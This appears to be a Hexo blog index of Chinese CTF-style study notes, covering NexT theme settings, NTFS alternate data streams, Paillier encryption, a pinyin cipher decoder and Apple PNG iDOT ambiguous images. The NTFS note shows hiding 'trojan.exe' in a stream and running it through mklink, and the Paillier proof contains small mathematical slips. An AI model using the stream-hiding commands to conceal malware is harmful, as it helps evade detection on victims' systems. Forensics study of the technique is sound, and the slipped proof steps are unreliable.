<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">icon:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">fa</span> <span class="string">fa-user</span>			<span class="comment"># Font Awesome 图标的名称。</span></span><br><span class="line">    <span class="attr">animated:</span> <span class="literal">true</span>				<span class="comment"># 图标动画化</span></span><br><span class="line">    <span class="attr">color:</span> <span class="string">&#x27;ff0000&#x27;</span>				<span class="comment"># 图标颜色</span></span><br></pre></td></tr></table></figure>
<h3 id="网站版权名称---site-copyright-name">网站版权名称 - Site
Copyright Name</h3>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">copyright:</span> [<span class="string">name</span>]				<span class="comment"># 空白默认使用站点配置下的 author</span></span><br></pre></td></tr></table></figure>
<h3 id="网站平台信息---site-platform-information">网站平台信息 - Site
Platform Information</h3>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">powered:</span> <span class="literal">false</span>				<span class="comment"># 是否显示网站框架</span></span><br></pre></td></tr></table></figure>
<h3 id="网站备案信息---site-beian-information">网站备案信息 - Site Beian
Information</h3>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">beian:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span>				<span class="comment"># 是否显示以下信息</span></span><br><span class="line">    <span class="attr">icp:</span> <span class="string">京ICP备</span> <span class="number">1234567890</span><span class="string">号-1</span></span><br><span class="line">    <span class="attr">gongan_id:</span> <span class="number">1234567890</span></span><br><span class="line">    <span class="attr">gongan_num:</span> <span class="string">京公网安备</span> <span class="number">1234567890</span><span class="string">号</span></span><br><span class="line">    <span class="attr">gongan_icon_url:</span> <span class="string">/uploads/beian.png</span></span><br></pre></td></tr></table></figure>
<h2 id="博文摘要配置---preamble-text">博文摘要配置 - Preamble Text</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">excerpt_description:</span> <span class="literal">true</span>		<span class="comment"># 使用 description 的内容作为 Read More 的摘要。</span></span><br><span class="line"><span class="attr">read_more_btn:</span> <span class="literal">true</span>				<span class="comment"># 显示 Read More 按钮</span></span><br><span class="line"><span class="attr">auto_excerpt:</span></span><br><span class="line">	<span class="attr">enable:</span> <span class="literal">true</span>				<span class="comment"># 若不开启且 description 为空则使用全文做摘要</span></span><br><span class="line">	<span class="attr">length:</span> <span class="number">150</span>					<span class="comment"># 摘要长度</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：该配置会与 <code>&lt;!-- more --&gt;</code> 产生冲突</p>
</blockquote>
<blockquote>
<p>front-matter: description</p>
</blockquote>
<h2 id="发布信息配置---post-meta-display">发布信息配置 - Post Meta
Display</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_meta:</span></span><br><span class="line">  <span class="attr">item_text:</span> <span class="literal">true</span>				<span class="comment"># 显示描述文本</span></span><br><span class="line">  <span class="attr">created_at:</span> <span class="literal">true</span>				<span class="comment"># 显示创建时间</span></span><br><span class="line">  <span class="attr">updated_at:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span>				<span class="comment"># 显示更新时间</span></span><br><span class="line">    <span class="attr">another_day:</span> <span class="literal">true</span>			<span class="comment"># 显示更新日</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="literal">true</span>				<span class="comment"># 显示分类</span></span><br></pre></td></tr></table></figure>
<h2 id="文末标签图标---tag-icon">文末标签图标 - Tag Icon</h2>
<p>默认情况下，博文末尾存在以#开头的标签超链接。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">tag_icon:</span> <span class="literal">true</span>					<span class="comment"># 开启标签图标</span></span><br></pre></td></tr></table></figure>
<h2 id="捐赠打赏配置---donate-settings">捐赠、打赏配置 - Donate
Settings</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">reward_settings:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span>					<span class="comment"># 开启捐赠链接 (默认在所有博文下显示)</span></span><br><span class="line">  <span class="attr">animation:</span> <span class="literal">false</span>				<span class="comment"># 是否开启动画效果</span></span><br><span class="line">  <span class="attr">comment:</span> <span class="string">&#x27;&#x27;</span>					<span class="comment"># 捐赠注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 收款码</span></span><br><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="comment">#wechatpay: /images/wechatpay.png	</span></span><br><span class="line">  <span class="comment">#alipay: /images/alipay.png</span></span><br></pre></td></tr></table></figure>
<h2 id="关注---follow-me">关注 - Follow Me</h2>
<blockquote>
<p>参数参考<a href="#侧边栏社交链接%20-%20Sidebar%20Social%20Links">侧边栏社交链接 -
Sidebar Social Links</a></p>
</blockquote>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">follow_me:</span></span><br><span class="line">  <span class="comment">#Twitter: https://twitter.com/username || fab fa-twitter</span></span><br><span class="line">  <span class="comment">#Telegram: https://t.me/channel_name || fab fa-telegram</span></span><br><span class="line">  <span class="comment">#WeChat: /images/wechat_channel.jpg || fab fa-weixin</span></span><br><span class="line">  <span class="comment">#RSS: /atom.xml || fa fa-rss</span></span><br></pre></td></tr></table></figure>
<h2 id="博文编辑配置---post-edit">博文编辑配置 - Post Edit</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_edit:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span>					<span class="comment"># 是否允许在存储库直接浏览和编辑源代码</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/</span></span><br></pre></td></tr></table></figure>
<h2 id="博文导航配置---post-navigation">博文导航配置 - Post
Navigation</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_navigation:</span> <span class="string">left</span>			<span class="comment"># 上一章、下一章 (left | right | false)</span></span><br></pre></td></tr></table></figure>
<h2 id="cdn配置---preconnect">CDN配置 - Preconnect</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">preconnect:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="文本对齐方式---text-align">文本对齐方式 - Text Align</h2>
<table>
<colgroup>
<col style="width: 18%">
<col style="width: 81%">
</colgroup>
<thead>
<tr class="header">
<th>值</th>
<th>Effect</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>start</code></td>
<td>The same as <code>left</code> if direction is left-to-right and
<code>right</code> if direction is right-to-left.</td>
</tr>
<tr class="even">
<td><code>end</code></td>
<td>The same as <code>right</code> if direction is left-to-right and
<code>left</code> if direction is right-to-left.</td>
</tr>
<tr class="odd">
<td><code>left</code></td>
<td>The inline contents are aligned to the left edge of the line
box.</td>
</tr>
<tr class="even">
<td><code>right</code></td>
<td>The inline contents are aligned to the right edge of the line
box.</td>
</tr>
<tr class="odd">
<td><code>center</code></td>
<td>The inline contents are centered within the line box.</td>
</tr>
<tr class="even">
<td><code>justify</code></td>
<td>The inline contents are justified. Text should be spaced to line up
its left and right edges to the left and right edges of the line box,
except for the last line.</td>
</tr>
<tr class="odd">
<td><code>justify-all</code></td>
<td>Same as <code>justify</code>, but also forces the last line to be
justified.</td>
</tr>
<tr class="even">
<td><code>match-parent</code></td>
<td>Similar to <code>inherit</code>, but the values <code>start</code>
and <code>end</code> are calculated according to the parent's direction
and are replaced by the appropriate <code>left</code> or
<code>right</code> value.</td>
</tr>
</tbody>
</table>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">text_align:</span></span><br><span class="line">  <span class="attr">desktop:</span> <span class="string">justify</span>				<span class="comment"># 桌面端</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="string">justify</span>				<span class="comment"># 移动端</span></span><br></pre></td></tr></table></figure>
<h2 id="移动端适配---mobile-devices-adaptation">移动端适配 - Mobile
Devices Adaptation</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mobile_layout_economy:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="主题颜色---theme-color">主题颜色 - Theme Color</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme_color:</span></span><br><span class="line">  <span class="attr">light:</span> <span class="string">&quot;#222&quot;</span></span><br><span class="line">  <span class="attr">dark:</span> <span class="string">&quot;#222&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="正文滚动条---body-scrollbar">正文滚动条 - Body Scrollbar</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">body_scrollbar:</span></span><br><span class="line">  <span class="attr">overlay:</span> <span class="literal">false</span>				<span class="comment"># 是否使用正文滚动条 (会覆盖浏览器默认样式)</span></span><br><span class="line">  <span class="attr">stable:</span> <span class="literal">false</span>					<span class="comment"># 是否固定滚动条</span></span><br></pre></td></tr></table></figure>
<h2 id="代码样式---codeblock-style">代码样式 - Codeblock Style</h2>
<p>NexT使用<a href="https://highlightjs.org/">Highlight.js</a>和<a href="https://prismjs.com/">Prism</a>进行语法高亮</p>
<p>可以预先使用<a href="https://theme-next.js.org/highlight/">NexT
Highlight Theme Preview</a>查看配置效果</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">codeblock:</span></span><br><span class="line">  <span class="attr">theme:</span></span><br><span class="line">    <span class="attr">light:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">dark:</span> <span class="string">tomorrow-night</span></span><br><span class="line">  <span class="attr">prism:</span></span><br><span class="line">    <span class="attr">light:</span> <span class="string">prism</span></span><br><span class="line">    <span class="attr">dark:</span> <span class="string">prism-dark</span></span><br><span class="line">  <span class="attr">copy_button:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span>				<span class="comment"># 启用代码一键复制按钮</span></span><br><span class="line">    <span class="attr">style:</span>						<span class="comment"># 代码框样式 (default | flat | mac)</span></span><br></pre></td></tr></table></figure>
<h2 id="快速回顶---back-to-top">快速回顶 - Back To Top</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">back2top:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>					<span class="comment"># 启用快速回顶按钮</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">false</span>				<span class="comment"># 按钮嵌入侧边栏</span></span><br><span class="line">  <span class="attr">scrollpercent:</span> <span class="literal">false</span>			<span class="comment"># 按钮嵌入滚动条</span></span><br></pre></td></tr></table></figure>
<h2 id="阅读进度---reading-progress">阅读进度 - Reading Progress</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">reading_progress:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>					<span class="comment"># 是否启用阅读进度提示</span></span><br><span class="line">  <span class="attr">start_at:</span> <span class="string">left</span>				<span class="comment"># 从左开始还是从右开始加载 (left | right)</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">top</span>					<span class="comment"># 位置在哪 (top | bottom)</span></span><br><span class="line">  <span class="attr">reversed:</span> <span class="literal">false</span>				<span class="comment"># (从满到无 | 从无到满)</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&quot;#37c6c0&quot;</span>				<span class="comment"># 进度条颜色</span></span><br><span class="line">  <span class="attr">height:</span> <span class="string">2px</span>					<span class="comment"># 进度条粗细</span></span><br></pre></td></tr></table></figure>
<h2 id="书签---bookmark">书签 - Bookmark</h2>
<p>书签标记后，下一次进入网站自动跳转到用户上一次浏览的地方</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">bookmark:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span>					<span class="comment"># 开启书签</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&quot;#222&quot;</span>					<span class="comment"># 书签的颜色</span></span><br><span class="line">  <span class="attr">save:</span> <span class="string">auto</span>					<span class="comment"># 是否自动保存书签 (auto | manual)</span></span><br></pre></td></tr></table></figure>
<h2 id="字体配置---fonts-customization">字体配置 - Fonts
Customization</h2>
<p><strong>NexT</strong> 提供了 5 种特定的字体设置：</p>
<ul>
<li><strong>Global Font</strong>: 整个网站的基本字体</li>
<li><strong>Title Font</strong>: 网站标题的字体</li>
<li><strong>Headlines Font</strong>: 内容标题的字体</li>
<li><strong>Article Font</strong>: 内容的字体</li>
<li><strong>Code Font</strong>: 代码字体</li>
</ul>
<blockquote>
<p>如果字体不可用，会回退到 NexT 主题默认的字体</p>
</blockquote>
<p>详情请参考 <a href="https://theme-next.js.org/docs/theme-settings/miscellaneous.html#Fonts-Customization">Fonts
Customization</a></p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>hexo</tag>
        <tag>NexT</tag>
      </tags>
  </entry>
  <entry>
    <title>ntfs 数据流笔记</title>
    <url>//ntfs-streams-note.html</url>
    <content><![CDATA[<h1 id="ntfs-简述">NTFS 简述</h1>
<p>NTFS文件系统时windows
NT内核系列操作系统支持的、专门为网络和磁盘配额的，文件加密等管理安全特性设计的磁盘格式。NTFS比FAT文件系统更加稳定，更能也更为强大。</p>
<p>NTFS数据流文件也被称为 Alternate data
streams，简称ADS，是NTFS文件系统的一个特性之一，允许单独的数据流文件存在，同时也允许文件附着多个数据流，除了主文件流之外还允许许多非主文件流寄生在主文件流中，使用资源派生的方式来维持与文件的相关信息，并且这些寄生的数据流文件我们使用资源管理器无法看到。</p>
<p>ADS的作用在于，它允许一个文件携带着附加的信息。例如，IE浏览器下载文件时，会向文件添加一个数据流，标记该文件来源于外部，即带有风险，那么，在用户打开文件时，就会弹出文件警告提示。再如，在网址收藏中，也会附加一个favicon数据流以存放网站图标。</p>
<p>ADS原意是为了和Macintosh的HFS文件系统兼容而设计的，使用这种技术可以在一个文件资源里写入相关数据(并不是写入文件中)，而且写进去的数据可以使用很简单的方法把它提取出来作为一个独立文件读取，甚至执行。但不少后门程序使用ADS隐藏自己。</p>
<p>而创建一个NTFS交换数据流文件的方式很简单，命令为
<code>宿主文件：寄宿文件</code></p>
<h1 id="使用-ntfs-交换数据流隐藏数据">使用 NTFS 交换数据流隐藏数据</h1>
<p>以下命令均需要在 NTFS 分区中使用，因为 ADS 是 NTFS 的特性，类似于
FAT32 文件系统并不适用。而且需要使用命令提示符软件，使用 powershell
可能会报错。</p>
<p>因为 NTFS 交换数据流文件可以存放数据，而 NTFS
交换数据流我们又没办法直接通过资源管理器查看，所以我们只需要对其写入数据即可使用
NTFS 交换数据流隐藏数据。</p>
<p>比如说我们使用指令
<code>echo this is a secret &gt; 1.txt:ads.txt</code> 来将文本
<code>this is a secret</code> 写入寄宿于 <code>1.txt</code> 的
<code>ads.txt</code> NTFS 交换数据流文件中。</p>
<p>又或者使用 <code>type 涩图.png &gt; peace.txt:secret.txt</code> 来将
<code>涩图.png</code> 转成文本信息后写入 NTFS 交换数据流文件
<code>peace.txt:secret.txt</code> 中。</p>
<p>同理我们甚至可以使用
<code>type trojan.exe &gt; surprise.txt:horse.exe</code> 将
<code>trojan.exe</code> 写入 NTFS 交换数据流文件
<code>surprise.txt:horse.exe</code> 中。</p>
<p>而实际上上面这个方法在以前的病毒中经常使用。</p>
<h1 id="查看-ntfs-交换数据流数据">查看 NTFS 交换数据流数据</h1>
<h2 id="使用-windows-指令查看">使用 Windows 指令查看</h2>
<p>Windows 指令是可以直接检索到 NTFS
交换数据流的，但前提是需要知道目标的名字。</p>
<p>例如对于 <code>echo this is a secret &gt; 1.txt:ads.txt</code>
生成的数据，我们可以使用 <code>notepad</code> 来查看，即
<code>notepad 1.txt:ads.txt</code>。</p>
<p>对于 <code>type 涩图.png &gt; peace.txt:secret.txt</code>
生成的数据，我们可以使用 <code>mspaint</code> 来查看，即
<code>maspaint peace.txt:secret.txt</code>。</p>
<p>同时使用以上方式也可以直接修改 NTFS 交换数据流的数据 (文件)。</p>
<p>对于 <code>type trojan.exe &gt; surprise.txt:horse.exe</code>
生成的数据，在 Windows XP 上可以使用 <code>start</code>
指令直接启动可执行文件，即
<code>start surprise.txt:horse.exe</code>；但在 Windows 7
及之后的系统中，微软为了安全起见，不能再通过 <code>start</code>
指令启动可执行文件，只能先使用 <code>mklink</code>
指令创建一个符号链接文件指向 NTFS
交换数据流文件，然后再直接执行符号链接文件，即
<code>mklink a.exe surprise.txt:horse.exe &amp;&amp; a.exe</code>。</p>
<h2 id="使用-ntfs-streams-editor-软件查看">使用 Ntfs Streams Editor
软件查看</h2>
<figure>
<img src="/ntfs-streams-note/NtfsStreamsEditor2.png" alt="NtfsStreamsEditor2">
<figcaption aria-hidden="true">NtfsStreamsEditor2</figcaption>
</figure>
<p>我们可以使用它指定一个磁盘或文件夹进行扫描，将直接扫描出该磁盘或文件夹下所存在的数据流，同时可以通过该文件直接打开文件查看内容。</p>
<figure>
<img src="/ntfs-streams-note/scanner.png" alt="scanner">
<figcaption aria-hidden="true">scanner</figcaption>
</figure>
<p>而且我们也可以使用它来写入 NTFS 交换数据流文件，关于 Ntfs Streams
Editor 的更多功能，这里不写详细介绍，建议自行探索。</p>
<h1 id="ntfs-交换数据流与-winrar">NTFS 交换数据流与 WinRAR</h1>
<p>当你想要压缩存在 NTFS
交换数据流的文件时，要注意到现在流行的压缩方式，只有 <code>rar</code>
格式才可以保存 NTFS 交换数据流。</p>
<p>在使用 WinRAR 压缩时，可以使用 <code>高级 - 保存文件流数据</code>
来保存 NTFS 交换数据流不被忽略。</p>
<p>同时解压时也需要使用 WinRAR 解压才能获得完整的 NTFS 交换数据流。</p>
<p>而且我们可以观察到，当被压缩文件有 NTFS 交换数据流的时候，在 RAR
压缩包中会出现值为 <code>Service(NTFS streams) block</code>
的数据块，并且文件名称也会泄露出来，但压缩包中无法直接查看。</p>
<figure>
<img src="/ntfs-streams-note/ADS%20filename.png" alt="ADS filename">
<figcaption aria-hidden="true">ADS filename</figcaption>
</figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>ntfs</tag>
      </tags>
  </entry>
  <entry>
    <title>paillier同态加密算法笔记</title>
    <url>//paillier-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>同态加密，即原来在明文上的运算操作，经过同态加密后在密文上同样可以进行。一般有半同态和全同态加密之分：</p>
<p>半同态加密（Partial Homomorphic Encryption,
PHE）：只支持某些特定的运算法则 f ,PHE
的优点是原理简单、易实现，缺点是仅支持一种运算(加法或乘法)；</p>
<p>层次同态加密（Liveled HE，LHE）：一般支持有限次数的加密算法,LHE
的优点是同时支持加法和乘法，并且因为出现时间比 PHE
晚，所以技术更加成熟、一般效率比 FHE 要高很多、和 PHE 效率接近或高于
PHE，缺点是支持的计算次数有限。</p>
<p>全同态加密（Fully Homomorphic Encryption,
FHE）：支持无限次的任意运算法则 f，FHE 有以下类别：基于理想格的 FHE
方案、基于 LWE/RLWE 的 FHE 方案等等。FHE
的优点是支持的算子多并且运算次数没有限制，缺点是效率很低，目前还无法支撑大规模的计算。</p>
<p>第一个满足加法和乘法同态的同态加密方法直到 2009 年才由 Craig Gentry
提出。目前来说，全同态加密算法性能较差，应用较少。比较常用的是半同态加密算法，实现方式有
RSA （乘法同态）、Elgamal、Paillier （加法同态）等。</p>
<p>而 Paillier 算法是同态加密算法的一种，是 Pascal paillier
在1999年发明的概率公钥加密算法，该算法基于复合剩余类的困难问题，是一种满足加法的同态加密算法，已经广泛应用在加密信号处理或第三方数据处理领域。</p>
<h1 id="paillier-算法">Paillier 算法</h1>
<h2 id="算法描述">算法描述</h2>
<ol type="1">
<li>随机选择两个素数 <span class="math inline">\(p,q\)</span>，存在
<span class="math inline">\(n=pq\)</span> 且满足 <span class="math inline">\(\gcd(n,\varphi(n))\)</span>，该条件保证 <span class="math inline">\(p,q\)</span> 长度相等</li>
<li>计算 <span class="math inline">\(\lambda=\mathrm{lcm}(p-1,q-1)\)</span></li>
<li>随机选择 <span class="math inline">\(g\in Z_{n^2}^*\)</span> 且满足
<span class="math inline">\(\gcd(L(g^\lambda\mod{n^2}),n)=1\)</span>，其中
<span class="math inline">\(L(x)=\displaystyle\frac{x-1}{n}\)</span>（为简单会取
<span class="math inline">\(g=n+1\)</span>），<span class="math inline">\(\mu=(L(g^\lambda\mod{n^2})^{-1}\)</span></li>
<li>公钥定义为 <span class="math inline">\((n,g)\)</span></li>
<li>私钥定义为 <span class="math inline">\((\mu,\lambda)\)</span></li>
</ol>
<h2 id="加密过程">加密过程</h2>
<p>对于任意明文 <span class="math inline">\(m\in
Z_n\)</span>，任选一个随机数 <span class="math inline">\(r&lt;n\)</span>，加密过程为 <span class="math display">\[
c=g^mr^n\pmod{n^2}
\]</span></p>
<h2 id="解密过程">解密过程</h2>
<p>密文 <span class="math inline">\(c\in
Z_{n^2}^*\)</span>，则解密过程为 <span class="math display">\[
m=\mu
L(c^\lambda\mod{n^2})\pmod{n}=\frac{L(c^\lambda\mod{n^2})}{L(g^\lambda\mod{n^2})}
\]</span></p>
<h2 id="正确性分析">正确性分析</h2>
<p>因为 <span class="math inline">\((p-1)|\lambda,(q-1)|\lambda\)</span></p>
<p>所以 <span class="math inline">\(\lambda=k_1(p-1)=k_2(q-1)\)</span>，其中 <span class="math inline">\(k_1,k_2\in Z\)</span></p>
<p>由费马小定理可得 <span class="math inline">\(g^\lambda=g^{k_1(p-1)}\equiv
1\pmod{p}\)</span>，故 <span class="math inline">\((g^\lambda-1)|p\)</span></p>
<p>同理可得 <span class="math inline">\(g^\lambda=g^{k_2(q-1)}\equiv
1\pmod{q},(g^\lambda-1)|q\)</span></p>
<p>所以 <span class="math inline">\((g^\lambda-1)|pq\)</span>，即 <span class="math inline">\(g^\lambda\equiv 1\pmod{n}\)</span></p>
<p>所以 <span class="math inline">\(g^\lambda\pmod{n^2}\equiv
1\pmod{n}\)</span></p>
<p>即 <span class="math inline">\(g^\lambda\pmod{n^2}=nk_g+1,k&lt;n\)</span></p>
<p>所以 <span class="math inline">\(L(g^\lambda\pmod{n^2})=k_g\)</span></p>
<p>而且有 <span class="math display">\[
1+kn\equiv1+kn\pmod{n^2}\\
(1+kn)^2\equiv1+2kn+(kn)^2\equiv1+2kn\pmod{n^2}\\
(1+kn)^3\equiv1+3(kn)^2+3kn+(kn)^3\equiv1+3kn\pmod{n^2}\\
\cdots
\]</span> 观察可得（可以使用数学归纳法，实际上与二项式定理相关） <span class="math display">\[
(1+kn)^m\equiv1+knm\pmod{n^2}
\]</span> 所以 <span class="math display">\[
g^{m\lambda}=(1+k_gn)^m\equiv1+k_gnm\pmod{n^2}\\
r^{n\lambda}=(1+k_n)^n\equiv1+k_nn^2\pmod{n^2}\equiv1\pmod{n^2}
\]</span> 则有 <span class="math inline">\(L(g^{m\lambda}r^{n\lambda}\pmod{n^2})=L(k_nnm+1)=mk_g\)</span></p>
<p>又 <span class="math inline">\(L(g^\lambda\pmod{n^2})=k_g\)</span></p>
<p>所以 <span class="math display">\[
\frac{L(c^\lambda\mod{n^2})}{L(g^\lambda\mod{n^2})}=\frac{mk_g}{k_g}=m\pmod{n}
\]</span> 证毕。</p>
<h2 id="加法同态性质">加法同态性质</h2>
<p>对于任意明文 <span class="math inline">\(m_1,m_2\in Z_n\)</span>
和任意随机数 <span class="math inline">\(r_1,r_2\in
Z_n^*\)</span>，对应密文 <span class="math inline">\(c_1=E(m_1,r_1),c_2=E(m_2,r_2)\)</span> 满足 <span class="math display">\[
c_1\cdot c_2=E(m_1,r_1)\cdot E(m_2,r_2)=g^{m_1+m_2}\cdot (r_1\cdot
r_2)^n\pmod{n^2}
\]</span> 解密可得 <span class="math display">\[
D(c_1,c_2)=D[E(m_1,r_1)\cdot E(m_2,r_2)\pmod{n^2}]=m_1+m_2\pmod{n}
\]</span> 故结论为 <span class="math inline">\(c_1\cdot
c_2=m_1+m_2\)</span></p>
<p>即<strong>密文乘等于明文加</strong>。</p>
<p>通过分析发现，密文乘时，含有的明文是在指数上相加的，所以解密后就可以得到明文相加结果。</p>
<p>为什么叫加法同态呢？我们一般希望密文计算的结果和我们明文计算的结果相同，所以对于密文上是如何计算的不做要求。这时我们在明文上实现了加法的目的，就叫它加法同态。由此还扩展出了<strong>同态加和标量乘的性质</strong>。</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>汉字拼音加密笔记</title>
    <url>//pinyin-encode-note.html</url>
    <content><![CDATA[<h1 id="原理">原理</h1>
<p>汉字拼音有多种表示法，为了让算法可逆，我们使用声调风格为拼音音调以数字形式加在拼音末尾处的格式。</p>
<blockquote>
<p>如 <code>聪</code> 表示为 <code>cong1</code></p>
</blockquote>
<p>我们使用 Python3 中的 <code>pypinyin</code> 包，借用其中的
<code>pypinyin.lazy_pinyin()</code> 函数快捷获取汉字拼音。</p>
<blockquote>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pypinyin import lazy_pinyin</span><br><span class="line">&gt;&gt;&gt; lazy_pinyin(<span class="string">&quot;独奏&quot;</span>, style=8)</span><br><span class="line">[<span class="string">&#x27;du2&#x27;</span>, <span class="string">&#x27;zou4&#x27;</span>]</span><br></pre></td></tr></table></figure>
</blockquote>
<p>然后我们将每个拼音的 ascii 码加起来，得到总和模 128
便可得到每个汉字所对应的 ascii 码明文。</p>
<blockquote>
<p>如 <code>独</code> 的拼音为 <code>'du2'</code>，所对应的 ascii
码明文为 11</p>
</blockquote>
<p>这样我们便得到了每个明文可以对应的汉字，其中按理来说，每个 ascii
明文所对应的汉字应该是多个的。</p>
<p>有关 <code>pypinyin</code> 库的用法可查阅它们的 github
主页和官方文档：</p>
<p>https://github.com/mozillazg/python-pinyin</p>
<p>https://pypinyin.readthedocs.io/zh_CN/master/</p>
<h1 id="代码">代码</h1>
<p>这里只给出解密代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pypinyin</span><br><span class="line"></span><br><span class="line">l = <span class="string">&#x27;夺旗赛好难啊&#x27;</span></span><br><span class="line">d = [pypinyin.lazy_pinyin(i, pypinyin.Style.TONE3) <span class="keyword">for</span> i <span class="keyword">in</span> l]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d[<span class="number">0</span>]:</span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        a += <span class="built_in">ord</span>(j)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a % <span class="number">128</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>PNG有关iDOT块的笔记</title>
    <url>//png-idot-note.html</url>
    <content><![CDATA[<h1 id="idot-块简述">iDOT 块简述</h1>
<p>这是 Apple 为了 PNG 解码速度而做的一个优化 。苹果为了让 PNG
格式的图片可以并行解码并且兼容原本的 PNG
标准，把图片内容分为<strong>前半</strong>与<strong>后半</strong>两部分，并把像素流分为多个
IDAT 块，然后在 PNG 文件里添加了一个 iDOT
辅助块，其中记录了<strong>前半</strong>与<strong>后半</strong>的分隔位置（<strong>后半</strong>数据相对
iDOT 块的偏移值）和解压后的像素高度，这样用 Apple 的 PNG 编码器编码的
PNG 图片用 Apple 自家的 PNG 解码器解码就可以分为 2
个并行的过程，以此充分利用多核性能，同时这样的 PNG
图片也能被普通解码器解码。</p>
<h1 id="在不同设备上显示不同">在不同设备上显示不同</h1>
<p>如果说我们让顺序解压的数据与并行解压后把数据拼一起的内容不一样，那么就可能出现在不同设备上显示不同的结果。</p>
<p>实现的原理非常的巧妙，就是通过利用 <code>zlib</code>
的非压缩块特性：非压缩块标识可以在压缩数据中指定一块区域在解压时忽略掉它。如果把非压缩块标识放到<strong>上半</strong>的末尾,而把被标记的数据放到<strong>下半</strong>的起始，当单独解压<strong>下半</strong>时数据不会被忽略，而<strong>上半</strong>和<strong>下半</strong>连在一起解压时，这些数据就会被忽略，这样就可以让数据在并行压缩被用到而顺序压缩时被忽略。</p>
<p>这个技巧相当的巧妙以至于 Apple 也没有想到，在 Apple
系统（MacOS、iOS）只要利用了系统的 PNG 解码器的软件都会受到影响（MacOS
上 Chrome 浏览器自带 PNG 解码器所以不受影响）。</p>
<p>我们可以使用 <a href="https://github.com/DavidBuchanan314/ambiguous-png-packer">https://github.com/DavidBuchanan314/ambiguous-png-packer</a>
来生成显示不同的图片。</p>
<blockquote>
<p>在现实生成网站：<a href="https://moonvy.com/apps/PNGemini/">https://moonvy.com/apps/PNGemini/</a></p>
</blockquote>
<p>当然，如果想要查看不同设备的图片，那么最好的方法当然是拥有一部<strong>苹果手机</strong>。</p>
<p><strong>特征</strong>：会出现一些杂乱无章的像素线条，这不是技术问题，而是因为原理上是拼接和不解压数据，所以只要是这种构造的图片，都会出现一些像素线条。</p>
<p>如下图：</p>
<figure>
<img src="/png-idot-note/男神.png" alt="男神">
<figcaption aria-hidden="true">男神</figcaption>
</figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>png</tag>
      </tags>
  </entry>
  <entry>
    <title>png 图片格式笔记</title>
    <url>//png-note.html</url>
    <content><![CDATA[<h1 id="前文">前文</h1>
<p>PNG
是一种采用无损压缩算法的位图格式，其设计目的是试图替代GIF和TIFF文件格式，同时增加一些GIF文件格式所不具备的特性。PNG
